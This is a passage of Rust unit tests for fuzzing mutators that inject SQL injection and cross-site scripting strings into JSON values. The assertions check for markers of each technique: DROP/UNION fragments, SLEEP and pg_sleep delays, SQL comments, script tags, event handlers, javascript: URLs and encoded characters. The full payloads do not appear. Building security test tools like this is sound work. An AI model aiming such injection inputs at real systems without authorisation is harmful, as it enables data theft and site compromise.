    fn test_sql_injection_mutator_name() {
        assert_eq!(SQLInjectionMutator.name(), "sql_injection");
    }

    #[test]
    fn test_sql_injection_changes_value() {
        let base = json!({"query": "SELECT * FROM users"});
        let mutated = SQLInjectionMutator.mutate(&base, 1);
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_sql_injection_deterministic() {
        let base = json!({"query": "SELECT * FROM users"});
        let a = SQLInjectionMutator.mutate(&base, 42);
        let b = SQLInjectionMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_sql_injection_fragment() {
        // seed=2 -> choice 0 (SQL fragments)
        let base = json!("SELECT * FROM users");
        let mutated = SQLInjectionMutator.mutate(&base, 2);
        let s = mutated.as_str().unwrap();
        assert!(s.contains('\'') || s.contains("DROP") || s.contains("UNION"));
    }

    #[test]
    fn test_sql_injection_time_based() {
        // seed=10 -> choice 1 (time-based)
        let base = json!("SELECT * FROM users");
        let mutated = SQLInjectionMutator.mutate(&base, 10);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("SLEEP") || s.contains("WAITFOR") || s.contains("pg_sleep"));
    }

    #[test]
    fn test_sql_injection_comment() {
        // seed=1 -> choice 2 (comment)
        let base = json!("SELECT * FROM users");
        let mutated = SQLInjectionMutator.mutate(&base, 1);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("--") || s.contains("/*"));
    }

    #[test]
    fn test_sql_injection_preserves_non_string() {
        let base = json!({"count": 42});
        let mutated = SQLInjectionMutator.mutate(&base, 0);
        assert_eq!(mutated["count"], json!(42));
    }

    // -----------------------------------------------------------------------
    // XSSInjectionMutator tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_xss_injection_mutator_name() {
        assert_eq!(XSSInjectionMutator.name(), "xss_injection");
    }

    #[test]
    fn test_xss_injection_changes_value() {
        let base = json!({"name": "hello"});
        let mutated = XSSInjectionMutator.mutate(&base, 1);
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_xss_injection_deterministic() {
        let base = json!({"name": "test"});
        let a = XSSInjectionMutator.mutate(&base, 42);
        let b = XSSInjectionMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_xss_injection_script_tag() {
        // seed=2 -> choice 0 (script tags)
        let base = json!("hello");
        let mutated = XSSInjectionMutator.mutate(&base, 2);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("<script>"));
    }

    #[test]
    fn test_xss_injection_event_handler() {
        // seed=4 -> choice 1 (event handlers)
        let base = json!("hello");
        let mutated = XSSInjectionMutator.mutate(&base, 4);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("onerror") || s.contains("onload") || s.contains("onfocus"));
    }

    #[test]
    fn test_xss_injection_javascript_url() {
        // seed=0 -> choice 2 (javascript: URLs)
        let base = json!("hello");
        let mutated = XSSInjectionMutator.mutate(&base, 0);
        let s = mutated.as_str().unwrap();
        assert!(s.to_lowercase().contains("javascript:"));
    }

    #[test]
    fn test_xss_injection_encoded() {
        // seed=7 -> choice 3 (encoded)
        let base = json!("hello");
        let mutated = XSSInjectionMutator.mutate(&base, 7);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("&#") || s.contains("\\u003c") || s.contains("&#x"));
    }

    #[test]
    fn test_xss_injection_preserves_non_string() {
        let base = json!({"count": 42});
        let mutated = XSSInjectionMutator.mutate(&base, 0);
        assert_eq!(mutated["count"], json!(42));
    }
}
